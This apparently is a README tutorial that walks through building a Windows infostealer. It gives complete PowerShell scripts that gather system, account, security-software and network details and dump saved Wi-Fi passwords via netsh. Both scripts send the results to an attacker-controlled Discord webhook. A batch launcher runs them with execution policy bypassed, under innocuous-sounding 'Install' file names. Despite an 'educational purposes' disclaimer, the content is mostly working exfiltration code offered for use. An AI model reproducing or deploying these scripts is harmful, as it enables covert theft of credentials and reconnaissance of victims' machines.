# Introduction
This project contains scripts to gather detailed system information and Wi-Fi profiles along with their passwords, and send this information to a specified Discord webhook. The scripts are divided into two PowerShell scripts and one batch file for execution.

Prerequisites:
- Windows OS
- PowerShell
- Discord
- A Virtual Machine for testing

# Disclamer:
### This project is intended for educational purposes only. By using this script, you acknowledge that it is your responsibility to ensure it is used ethically and legally. Unauthorized use of this script to access or share sensitive information may be illegal and unethical. Do not use this script for malicious purposes or in environments where you do not have explicit permission to collect system or Wi-Fi information.

# Step 1:
## Install discord, and setup a channel to recieve the messages.
1. Once you have a channel setup go to the setting of it and under "integrations" you will see the webhook option.
2. Select it and create a New Webhook.
3. Once you've created it, go ahead and copy the link for it. We will be using this later.

# Step 2:
## Now we want to setup our first powershell file.
1. Create a empty .ps1 file using either Notepad++, VSCode, or any other IDS of your choice.
2. Paste the following code into it and save it out.
3. Make sure you replace the "webhookUrl" to your discord channel's webhook link.
```powershell
# Define Discord webhook URL
$webhookUrl = "https://discord.com/YOUR_DISCORD_WEBHOOK_LINK"

# Function to send a message to Discord webhook
function Send-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )

    $Payload = @{
        "content" = $Message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'application/json' -Body $Payload
        Write-Host "Sending Message to Discord"
    } catch {
        Write-Host "Failed to send info..: $_"
    }
}

# Function to check and install required modules
function Install-RequiredModules {
    $requiredModules = @("NetTCPIP", "ImportExcel")  # Add any additional modules here if needed

    foreach ($module in $requiredModules) {
        if (-not (Get-Module -Name $module -ListAvailable)) {
            Write-Host "Installing module: $module"
            Install-Module -Name $module -Force -Scope CurrentUser -Confirm:$false
        }
    }
}

# Check and install required modules
Install-RequiredModules

# Import the ImportExcel module for Excel functionality
Import-Module ImportExcel

# Function to gather all usernames and password policies on the device
function Get-UserPasswordPolicies {
    $usernames = Get-WmiObject Win32_UserAccount | Select-Object -Property Name, PasswordExpires, PasswordRequired, LastLogin | ForEach-Object {
        $name = $_.Name
        $passwordExpires = $_.PasswordExpires
        $passwordRequired = $_.PasswordRequired
        $lastLogin = $_.LastLogin
        $passwordAge = ([datetime]::Now - [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity([System.DirectoryServices.AccountManagement.ContextType]::Machine, $name).LastPasswordSet).Days
        
        [PSCustomObject]@{
            Name = $name
            PasswordExpires = $passwordExpires
            PasswordRequired = $passwordRequired
            LastPasswordChange = $passwordAge
            LastLogin = $lastLogin
        }
    }
    return $usernames
}

# Function to get the public IP address
function Get-PublicIP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
        return $response.ip
    } catch {
        Write-Host "Failed to retrieve public IP address. Error: $_"
        return "Unavailable"
    }
}

# Function to gather system information
function Get-ServerInfo {
    # Get CPU and RAM usage
    $cpuUsage = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty LoadPercentage
    $ramUsage = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty FreePhysicalMemory

    # Get network information
    $networkInfo = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object IPAddress, DNSHostName, Description

    # Separate IPv4 and IPv6 addresses
    $ipv4Addresses = @()
    $ipv6Addresses = @()

    foreach ($network in $networkInfo) {
        foreach ($ip in $network.IPAddress) {
            if ($ip -match '\d+\.\d+\.\d+\.\d+') {
                $ipv4Addresses += $ip
            } elseif ($ip -match '[0-9a-fA-F:]+') {
                $ipv6Addresses += $ip
            }
        }
    }

    # Get TCP connection information
    $tcpConnections = Get-NetTCPConnection | Where-Object { $_.State -in @("Listen", "Established", "Close_Wait") } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State

    # Get disk usage information
    $diskInfo = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, @{Name="FreeSpace(GB)";Expression={[math]::truncate($_.FreeSpace / 1GB)}}, @{Name="Size(GB)";Expression={[math]::truncate($_.Size / 1GB)}}, @{Name="UsedSpace(GB)";Expression={[math]::truncate(($_.Size - $_.FreeSpace) / 1GB)}}

    # Get service statuses
    $services = Get-Service | Select-Object DisplayName, Status

    # Get performance metrics (example: CPU usage)
    $cpuMetrics = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object -ExpandProperty CookedValue
    $cpuUsagePercent = [math]::Round($cpuMetrics, 2)

    # Get user information
    $usersInfo = Get-WmiObject Win32_UserAccount | Select-Object Name, LastLogin

    # Get hardware information
    $hardwareInfo = Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model, TotalPhysicalMemory

    # Get security settings
    $firewallStatus = (Get-NetFirewallProfile -Profile Domain,Public,Private).Enabled -join ", "
    $uacStatus = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA

    # Get installed software
    $installedSoftware = Get-WmiObject -Class Win32_Product | Select-Object Name, Version

    # Get system uptime
    $uptime = (Get-WmiObject -Class Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime)
    $uptimeDays = (New-TimeSpan -Start $uptime -End (Get-Date)).Days

    # Get Windows Defender status
    $defenderStatus = Get-MpComputerStatus | Select-Object AMServiceEnabled, AMServiceVersion, NISServiceEnabled, NISSignatureLastUpdated, RealTimeProtectionEnabled

    # Get all usernames and password policies on the device
    $userPasswordPolicies = Get-UserPasswordPolicies

    # Get public IP address
    $publicIP = Get-PublicIP

    # Combine all information into a single object
    $systemInfo = New-Object PSObject -Property @{
        "CPU Usage (%)" = $cpuUsage
        "RAM Usage (MB free)" = $ramUsage / 1MB
        "IPv4 Addresses" = $ipv4Addresses -join ", "
        "IPv6 Addresses" = $ipv6Addresses -join ", "
        "Public IP Address" = $publicIP
        "TCP Connections" = $tcpConnections | Out-String
        "Disk Usage" = $diskInfo | Out-String
        "Services Status" = $services | Out-String
        "Users Info" = $usersInfo | Out-String
        "Hardware Info" = $hardwareInfo | Out-String
        "Firewall Status" = $firewallStatus
        "UAC Status" = $uacStatus
        "Installed Software" = $installedSoftware | Out-String
        "System Uptime (Days)" = $uptimeDays
        "Windows Defender Status" = $defenderStatus | Out-String
        "User Password Policies" = $userPasswordPolicies | Out-String
    }

    return $systemInfo
}

# Get system information
$systemInfo = Get-ServerInfo

# Prepare the message body
$body = @"
CPU Usage: $($systemInfo."CPU Usage (%)") %
RAM Usage: $($systemInfo."RAM Usage (MB free)") MB free
Network Info:
IPv4 Addresses: $($systemInfo."IPv4 Addresses")
IPv6 Addresses: $($systemInfo."IPv6 Addresses")
Public IP Address: $($systemInfo."Public IP Address")

TCP Connections:
$($systemInfo."TCP Connections")

Disk Usage:
$($systemInfo."Disk Usage")

Services Status:
$($systemInfo."Services Status")

Users Info:
$($systemInfo."Users Info")

Hardware Info:
$($systemInfo."Hardware Info")

Firewall Status: $($systemInfo."Firewall Status")
UAC Status: $($systemInfo."UAC Status")

Installed Software:
$($systemInfo."Installed Software")

System Uptime (Days): $($systemInfo."System Uptime (Days)")
Windows Defender Status:
$($systemInfo."Windows Defender Status")

User Password Policies:
$($systemInfo."User Password Policies")
"@

# Split the message if it's too long for Discord
function Split-Message {
    param (
        [string]$Message,
        [int]$MaxLength
    )

    $messages = @()
    while ($Message.Length -gt $MaxLength) {
        $part = $Message.Substring(0, $MaxLength)
        $lastNewLineIndex = $part.LastIndexOf("`n")
        if ($lastNewLineIndex -gt -1) {
            $part = $part.Substring(0, $lastNewLineIndex)
        }
        $messages += $part
        $Message = $Message.Substring($part.Length).TrimStart()
    }
    $messages += $Message
    return $messages
}

# Send the messages to Discord
$messages = Split-Message -Message $body -MaxLength 2000
foreach ($msg in $messages) {
    Send-DiscordWebhook -WebhookUrl $webhookUrl -Message $msg
}
```

# Step 3:
## Now it's time to setup our second powershell file.
1. Create another empty .ps1 file.
2. Paste the following code into it and save it out.
3. Make sure you replace the "webhookUrl" to your discord channel's webhook link.
```powershell
# Run PowerShell as Administrator for this script to work

# Function to get all Wi-Fi profiles
function Get-WiFiProfiles {
    $profilesOutput = netsh wlan show profiles
    $profileLines = $profilesOutput | Select-String -Pattern "All User Profile"
    $profiles = @()
    
    foreach ($line in $profileLines) {
        $profileName = ($line -replace 'All User Profile\s*:\s*', '').Trim()
        $profiles += $profileName
    }
    
    return $profiles
}

# Function to get the Wi-Fi password for a given profile name
function Get-WiFiPassword {
    param (
        [string]$profileName
    )
    $profileDetails = netsh wlan show profile name="$profileName" key=clear
    $passwordLines = $profileDetails | Select-String -Pattern "Key Content"
    if ($passwordLines) {
        $password = ($passwordLines -replace 'Key Content\s*:\s*', '').Trim()
        return $password
    } else {
        return "Password not found or not saved"
    }
}

# Function to send a message to Discord webhook
function Send-ToDiscord {
    param (
        [string]$message
    )
    $webhookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_LINK"
    $payload = @{
        content = $message
    }
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
}

# Main execution
$profiles = Get-WiFiProfiles

if ($profiles.Count -eq 0) {
    $message = "No Wi-Fi profiles found."
    Write-Output $message
    Send-ToDiscord -message $message
} else {
    foreach ($profile in $profiles) {
        $password = Get-WiFiPassword -profileName $profile
        $message = "Profile: $profile`nPassword: $password"
        Write-Output $message
        Send-ToDiscord -message $message
    }
}
```
# Step 4:
## Setup the batch file.
1. This batch file will be used to refrence and run our 2 powershell files.
2. Create empty .bat file and paste the following in and save it.
```batch
@echo off
:: Get the directory of the currently running batch file
set scriptDir=%~dp0

:: Set the PowerShell script file names
set scriptName1=Install_Files.ps1
set scriptName2=Install_dependenciess.ps1

:: Run the first PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -File "%scriptDir%%scriptName1%"

:: Run the second PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -File "%scriptDir%%scriptName2%"

:: End the batch file
exit
```

# Step 5:
## Testing time!
1. Your project directory should look something like this <br>
![](https://i.imgur.com/dLHUWE9.png)
2. Go ahead and run the batch file on a test device.
3. All the info on the test device should be showing up in your discord server now.
4. Enjoy!!
![](https://i.imgur.com/oVW2NQp.png)
![](https://i.imgur.com/N2DNV6L.png)
![](https://i.imgur.com/SfJjrA7.png)
![](https://i.imgur.com/FAXCWaG.png)
